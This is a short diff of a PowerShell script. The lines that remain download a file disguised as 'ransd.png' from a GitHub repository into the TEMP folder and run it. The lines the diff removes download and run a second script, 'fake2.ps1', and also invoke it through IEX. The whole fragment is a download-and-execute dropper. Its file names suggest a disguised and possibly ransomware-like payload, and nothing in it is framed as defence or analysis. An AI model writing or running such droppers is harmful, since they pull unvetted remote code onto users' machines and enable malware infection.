@@ -6,8 +6,3 @@ $url2 = "https://github.com/cia168168/folder/raw/main/fake/ransd.png"
 $output2 = "$env:TEMP\ransd.png"
 Invoke-WebRequest -Uri $url2 -OutFile $output2
 & $output2
-$url3 = "https://github.com/cia168168/folder/raw/main/fake/fake2.ps1"
-$output3 = "$env:TEMP\fake2.ps1"
-Invoke-WebRequest -Uri $url3 -OutFile $output3
-& $output3
-IEX ((New-Object Net.WebClient).DownloadString($output3))
